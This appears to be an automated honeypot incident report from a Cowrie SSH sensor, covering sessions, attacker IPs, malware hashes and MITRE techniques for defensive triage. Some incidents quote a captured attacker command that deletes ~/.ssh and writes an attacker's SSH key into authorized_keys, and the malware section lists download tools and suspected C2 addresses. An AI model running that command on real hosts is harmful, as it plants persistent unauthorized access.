| `2026-07-03 20:48:07` | `cowrie.session.connect` |
| `2026-07-03 20:48:07` | `cowrie.client.version` |
| `2026-07-03 20:48:07` | `cowrie.client.kex` |
| `2026-07-03 20:48:08` | `cowrie.login.success` |
| `2026-07-03 20:48:09` | `cowrie.session.params` |
| `2026-07-03 20:48:09` | `cowrie.command.input` |
| `2026-07-03 20:48:09` | `cowrie.command.failed` |
| `2026-07-03 20:48:09` | `cowrie.log.closed` |
| `2026-07-03 20:48:10` | `cowrie.session.params` |
| `2026-07-03 20:48:10` | `cowrie.command.input` |
| `2026-07-03 20:48:10` | `cowrie.session.file_download` |
| `2026-07-03 20:48:10` | `cowrie.log.closed` |
| `2026-07-03 20:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.243.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f731c85d5951

| Field | Detail |
|---|---|
| **Source IP** | `103.243.27[.]155` |
| **First Seen** | 2026-07-03 20:48 |
| **Last Seen** | 2026-07-03 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:48:11` | `cowrie.session.connect` |
| `2026-07-03 20:48:11` | `cowrie.client.version` |
| `2026-07-03 20:48:11` | `cowrie.client.kex` |
| `2026-07-03 20:48:12` | `cowrie.login.success` |
| `2026-07-03 20:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.243.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcb469ce677a

| Field | Detail |
|---|---|
| **Source IP** | `103.243.27[.]155` |
| **First Seen** | 2026-07-03 20:48 |
| **Last Seen** | 2026-07-03 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:48:12` | `cowrie.session.connect` |
| `2026-07-03 20:48:12` | `cowrie.client.version` |
| `2026-07-03 20:48:12` | `cowrie.client.kex` |
| `2026-07-03 20:48:13` | `cowrie.login.success` |
| `2026-07-03 20:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.243.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf7839dce9a

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-07-03 20:48 |
| **Last Seen** | 2026-07-03 20:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:48:13` | `cowrie.session.connect` |
| `2026-07-03 20:48:13` | `cowrie.client.version` |
| `2026-07-03 20:48:13` | `cowrie.client.kex` |
| `2026-07-03 20:48:14` | `cowrie.login.success` |
| `2026-07-03 20:48:15` | `cowrie.session.params` |
| `2026-07-03 20:48:15` | `cowrie.command.input` |
| `2026-07-03 20:48:15` | `cowrie.command.failed` |
| `2026-07-03 20:48:15` | `cowrie.log.closed` |
| `2026-07-03 20:48:16` | `cowrie.session.params` |
| `2026-07-03 20:48:16` | `cowrie.command.input` |
| `2026-07-03 20:48:16` | `cowrie.session.file_download` |
| `2026-07-03 20:48:16` | `cowrie.log.closed` |
| `2026-07-03 20:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b974a7538ba

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-07-03 20:48 |
| **Last Seen** | 2026-07-03 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:48:17` | `cowrie.session.connect` |
| `2026-07-03 20:48:17` | `cowrie.client.version` |
| `2026-07-03 20:48:17` | `cowrie.client.kex` |
| `2026-07-03 20:48:18` | `cowrie.login.success` |
| `2026-07-03 20:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2bd37ad6afc

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-07-03 20:48 |
| **Last Seen** | 2026-07-03 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:48:18` | `cowrie.session.connect` |
| `2026-07-03 20:48:18` | `cowrie.client.version` |
| `2026-07-03 20:48:19` | `cowrie.client.kex` |
| `2026-07-03 20:48:20` | `cowrie.login.success` |
| `2026-07-03 20:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80af6979a05d

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-07-03 20:52 |
| **Last Seen** | 2026-07-03 20:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:52:44` | `cowrie.session.connect` |
| `2026-07-03 20:52:44` | `cowrie.client.version` |
| `2026-07-03 20:52:44` | `cowrie.client.kex` |
| `2026-07-03 20:52:45` | `cowrie.login.success` |
| `2026-07-03 20:52:46` | `cowrie.session.params` |
| `2026-07-03 20:52:46` | `cowrie.command.input` |
| `2026-07-03 20:52:46` | `cowrie.command.failed` |
| `2026-07-03 20:52:47` | `cowrie.log.closed` |
| `2026-07-03 20:52:48` | `cowrie.session.params` |
| `2026-07-03 20:52:48` | `cowrie.command.input` |
| `2026-07-03 20:52:48` | `cowrie.session.file_download` |
| `2026-07-03 20:52:48` | `cowrie.log.closed` |
| `2026-07-03 20:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f58f1a9d6b1c

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-07-03 20:52 |
| **Last Seen** | 2026-07-03 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:52:48` | `cowrie.session.connect` |
| `2026-07-03 20:52:48` | `cowrie.client.version` |
| `2026-07-03 20:52:48` | `cowrie.client.kex` |
| `2026-07-03 20:52:49` | `cowrie.login.success` |
| `2026-07-03 20:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e117f851dbf

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-07-03 20:52 |
| **Last Seen** | 2026-07-03 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:52:50` | `cowrie.session.connect` |
| `2026-07-03 20:52:50` | `cowrie.client.version` |
| `2026-07-03 20:52:50` | `cowrie.client.kex` |
| `2026-07-03 20:52:51` | `cowrie.login.success` |
| `2026-07-03 20:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-481149150554

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 20:54 |
| **Last Seen** | 2026-07-03 20:54 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:54:23` | `cowrie.session.connect` |
| `2026-07-03 20:54:24` | `cowrie.client.version` |
| `2026-07-03 20:54:24` | `cowrie.client.kex` |
| `2026-07-03 20:54:31` | `cowrie.login.success` |
| `2026-07-03 20:54:34` | `cowrie.session.params` |
| `2026-07-03 20:54:34` | `cowrie.command.input` |
| `2026-07-03 20:54:36` | `cowrie.log.closed` |
| `2026-07-03 20:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **6** | 2026-07-03 19:26 | 2026-07-03 20:30 | 7m | 0 | `T1592` | 🟢 LOW |
| `120.232.177[.]187` | **5** | 2026-07-03 18:56 | 2026-07-03 20:48 | 4m | 0 | `T1592` | 🟢 LOW |
| `8.133.185[.]52` | **4** | 2026-07-03 19:39 | 2026-07-03 19:41 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.180.69[.]136` | **2** | 2026-07-03 18:58 | 2026-07-03 19:07 | 1m | 0 | `T1592` | 🟢 LOW |
| `116.172.130[.]79` | **2** | 2026-07-03 20:00 | 2026-07-03 20:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-03 19:19 | 2026-07-03 19:58 | 1m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-03 20:09 | 2026-07-03 20:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.96.225[.]252` | 1 | 2026-07-03 19:11 | 2026-07-03 19:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.12.84[.]220` | 1 | 2026-07-03 19:10 | 2026-07-03 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.217.10[.]60` | 1 | 2026-07-03 19:47 | 2026-07-03 19:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.175.140[.]121` | 1 | 2026-07-03 20:36 | 2026-07-03 20:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.226.216[.]189` | 1 | 2026-07-03 20:46 | 2026-07-03 20:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]3` | 1 | 2026-07-03 20:51 | 2026-07-03 20:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-03 19:11 | 2026-07-03 19:12 | 65s | 0 | `T1592` | 🟢 LOW |
| `180.106.80[.]16` | 1 | 2026-07-03 19:10 | 2026-07-03 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `206.189.18[.]100` | 1 | 2026-07-03 19:33 | 2026-07-03 19:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-07-03 20:34 | 2026-07-03 20:34 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-07-03 19:35 | 2026-07-03 19:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-03 20:44 | 2026-07-03 20:46 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 42/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |
| `170.239.72[.]126` | BR | MAXXNET TELECOM | **100** ⚠️ | 5 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `106.12.84[.]220` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 9 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `107.180.69[.]136` | US | GoDaddy.com, LLC | **100** ⚠️ | 12 |
| `8.133.185[.]52` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 7 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 18 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 72 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (73 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 66 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 179 cases |
| Tool 34  | Credential Extractor        | ✅ 101 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 53 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 73 filtered (40.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
